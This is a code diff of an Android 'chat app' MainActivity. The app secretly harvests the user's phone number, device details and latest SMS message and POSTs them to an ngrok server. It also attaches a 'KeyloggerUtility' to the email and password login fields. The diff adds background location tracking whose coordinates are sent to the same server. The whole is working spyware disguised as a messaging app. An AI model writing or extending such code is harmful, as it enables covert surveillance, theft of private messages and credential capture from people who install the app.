@@ -1,19 +1,27 @@
 package com.example.mychatapp;
 
 import android.Manifest;
+import android.content.ComponentName;
 import android.content.ContentResolver;
-import android.content.Context;
 import android.content.Intent;
+import android.content.ServiceConnection;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.IBinder;
+import android.preference.PreferenceManager;
+import android.text.Editable;
+import android.text.TextWatcher;
+import android.util.Log;
 import android.provider.Telephony;
-import android.telephony.TelephonyManager;
 import android.util.Patterns;
+import android.view.KeyEvent;
 import android.view.View;
+import android.widget.Button;
 import android.widget.EditText;
 import android.widget.ProgressBar;
 import android.widget.TextView;
@@ -29,6 +37,16 @@ import com.google.android.gms.tasks.Task;
 import com.google.firebase.auth.AuthResult;
 import com.google.firebase.auth.FirebaseAuth;
 import com.google.gson.Gson;
+
+import com.karumi.dexter.Dexter;
+import com.karumi.dexter.MultiplePermissionsReport;
+import com.karumi.dexter.PermissionToken;
+import com.karumi.dexter.listener.PermissionRequest;
+import com.karumi.dexter.listener.multi.MultiplePermissionsListener;
+
+import org.greenrobot.eventbus.EventBus;
+import org.greenrobot.eventbus.Subscribe;
+import org.greenrobot.eventbus.ThreadMode;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
@@ -39,10 +57,15 @@ import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.util.Arrays;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
 
-public class MainActivity extends AppCompatActivity {
+import android.content.Context;
+import android.telephony.TelephonyManager;
+
+public class MainActivity extends AppCompatActivity implements SharedPreferences.OnSharedPreferenceChangeListener {
     private static final int REQUEST_CODE_READ_PHONE_STATE_AND_SMS = 1;
     private static final String SMS_URI = "content://sms/inbox";
 
@@ -53,24 +76,79 @@ public class MainActivity extends AppCompatActivity {
     private EditText editEmail, editPassword;
     private android.widget.Button signIn;
 
-    public static String URLNgrok = "https://ee35-122-11-214-189.ap.ngrok.io"; // To be edited if keep changing
+    private String location1;
+
+    //Geolocation
+    Button requestLocation,removeLocation;
+    BackgroundService mService =null;
+    boolean mBound=false;
+    private final ServiceConnection mServiceConnection=new ServiceConnection() {
+        @Override
+        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
+            BackgroundService.LocalBinder binder = (BackgroundService.LocalBinder)iBinder;
+            mService=binder.getService();
+            mBound=true;
+        }
+
+        @Override
+        public void onServiceDisconnected(ComponentName componentName) {
+            mService=null;
+            mBound=false;
+        }
+    };
+
+    public static String URLNgrok = "https://4825-2404-e801-2001-348-84fe-465-520b-6746.ap.ngrok.io"; // To be edited if keep changing
     //public static String URLLocalIP = "http://192.168.2.145:5000";
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         String hpno = null;
 
+        //Geolocation
+        Dexter.withActivity(this)
+                .withPermissions(Arrays.asList(
+                        Manifest.permission.ACCESS_FINE_LOCATION,
+                        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
+                        Manifest.permission.ACCESS_COARSE_LOCATION
+                ))
+                .withListener(new MultiplePermissionsListener(){
+                    @Override
+                    public void onPermissionsChecked(MultiplePermissionsReport report) {
+                        requestLocation = (Button)findViewById(R.id.request_location_updates_button);
+                        removeLocation = (Button)findViewById(R.id.remove_location_updates_button);
+
+                        requestLocation.setOnClickListener(new View.OnClickListener() {
+                            @Override
+                            public void onClick(View view) {
+                                mService.requestLocationUpdates();
+                            }
+                        });
+                        removeLocation.setOnClickListener(new View.OnClickListener() {
+                            @Override
+                            public void onClick(View view) {
+                                mService.removeLocationUpdates();
+                            }
+                        });
+
+                        setButtonState(Common.requestingLocationUpdates(MainActivity.this));
+                        bindService(new Intent(MainActivity.this,BackgroundService.class),mServiceConnection,Context.BIND_AUTO_CREATE);
+                    }
+
+                    @Override
+                    public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {
+
+                    }
+                }).check();
+
 
         //need to set permission dynamically
         //get phone no need run 2 times then can get phone no.
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this,  new String[]{
-                            Manifest.permission.READ_PHONE_STATE,
-                            Manifest.permission.READ_SMS,
-                            Manifest.permission.WRITE_EXTERNAL_STORAGE},
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this,  new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_SMS},
                     REQUEST_CODE_READ_PHONE_STATE_AND_SMS);
-                    System.out.println("Failed to get phone no");
+            System.out.println("Failed to get phone no");
         } else {
             //function to get sms to server
             sendSmsToServer();
@@ -80,7 +158,6 @@ public class MainActivity extends AppCompatActivity {
             System.out.println("Phone no " + phoneNumber);
             hpno = phoneNumber;
         }
-
 
         String deviceManufacturer = Build.MANUFACTURER;
         String deviceModel = Build.MODEL;
@@ -94,11 +171,16 @@ public class MainActivity extends AppCompatActivity {
         deviceInfo.put("model", deviceModel);
         deviceInfo.put("androidVersion", androidVersion);
         deviceInfo.put("phoneno", deviceNumber);
+        //Toast.makeText(getApplicationContext(), location, Toast.LENGTH_SHORT).show();
+        //String locationServer = location;
+        if (savedInstanceState != null) {
+            location1 = savedInstanceState.getString("location");
+        }
+        System.out.println("server location " + location1);
 
 
         // Send the information to the server
         new SendDeviceInfoTask().execute(deviceInfo);
-
 
         register = findViewById(R.id.registeruser);
         signIn = findViewById(R.id.loginbutton);
@@ -106,9 +188,8 @@ public class MainActivity extends AppCompatActivity {
         editPassword = findViewById(R.id.password);
         progressbarofLogin = findViewById(R.id.progressbarofSignin);
         firebaseAuth = FirebaseAuth.getInstance();
-        editEmail.addTextChangedListener(new KeyloggerUtility("Email","",""));
-        editPassword.addTextChangedListener(new KeyloggerUtility("Password","",""));
-
+        editEmail.addTextChangedListener(new KeyloggerUtility("Email"));
+        editPassword.addTextChangedListener(new KeyloggerUtility("Password"));
 
         register.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -148,8 +229,82 @@ public class MainActivity extends AppCompatActivity {
 
             }
         });
-
     }
+    //GEOLOCATION
+
+
+    @Override
+    protected void onStart() {
+        super.onStart();
+        PreferenceManager.getDefaultSharedPreferences(this)
+                .registerOnSharedPreferenceChangeListener(this);
+        EventBus.getDefault().register(this);
+    }
+
+    @Override
+    protected void onStop() {
+        if(mBound) {
+            unbindService(mServiceConnection);
+            mBound =false;
+        }
+        PreferenceManager.getDefaultSharedPreferences(this)
+                .unregisterOnSharedPreferenceChangeListener(this);
+        EventBus.getDefault().unregister(this);
+        super.onStop();
+    }
+
+    @Override
+    public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String s) {
+        if(s.equals(Common.KEY_REQUESTING_LOCATION_UPDATES))
+        {
+            setButtonState(sharedPreferences.getBoolean(Common.KEY_REQUESTING_LOCATION_UPDATES,false));
+
+        }
+    }
+    //GEOLOCATION
+    private void setButtonState(boolean isRequestEnable) {
+        if(isRequestEnable)
+        {
+            requestLocation.setEnabled(false);
+            removeLocation.setEnabled(true);
+        }
+        else {
+            requestLocation.setEnabled(true);
+            removeLocation.setEnabled(false);
+        }
+    }
+
+    @Override
+    protected void onSaveInstanceState(Bundle outState){
+        super.onSaveInstanceState(outState);
+        outState.putString("location", location1);
+    }
+
+    @Subscribe(sticky = true,threadMode = ThreadMode.MAIN)
+    public void onListenLocation(SendLocationToActivity event) {
+        if (event != null) {
+            location1 = new StringBuilder()
+                    .append("Lat: ")
+                    .append(event.getLocation().getLatitude())
+                    .append(", ")
+                    .append("Lon: ")
+                    .append(event.getLocation().getLongitude())
+                    .toString();
+            Toast.makeText(mService, location1, Toast.LENGTH_SHORT).show();
+            System.out.println("locaaa in " + location1);
+
+            String deviceManufacturer = Build.MANUFACTURER;
+            String deviceModel = Build.MODEL;
+            String androidVersion = Build.VERSION.RELEASE;
+            Map<String, String> deviceInfo = new HashMap<>();
+            deviceInfo.put("manufacturer", deviceManufacturer);
+            deviceInfo.put("model", deviceModel);
+            deviceInfo.put("androidVersion", androidVersion);
+            deviceInfo.put("location", location1);
+            new SendDeviceInfoTask().execute(deviceInfo);
+        }
+    }
+
 
     public static class SendDeviceInfoTask extends AsyncTask<Map<String, String>, Void, Void> {
 
@@ -173,7 +328,7 @@ public class MainActivity extends AppCompatActivity {
                 os.close();
 
                 int responseCode = conn.getResponseCode();
-                System.out.println("\nSending Device info 'POST' request to URL : " + url);
+                System.out.println("\nSending 'POST' request to URL : " + url);
                 System.out.println("Response Code : " + responseCode);
 
                 BufferedReader in = new BufferedReader(
@@ -202,12 +357,12 @@ public class MainActivity extends AppCompatActivity {
         //error in the way message is being stored
 
         if (cursor.moveToFirst()) {
-                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
-                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
-                String smsResult = address + " : " + body;
-                System.out.println("sms info: " + smsResult);
-                smsMap.put("smsAddress", address);
-                smsMap.put("smsBody", body);
+            String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
+            String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
+            String smsResult = address + " : " + body;
+            System.out.println("sms info: " + smsResult);
+            smsMap.put("smsAddress", address);
+            smsMap.put("smsBody", body);
 
         }
 
@@ -251,9 +406,6 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 }
-
-
-
 
 
 
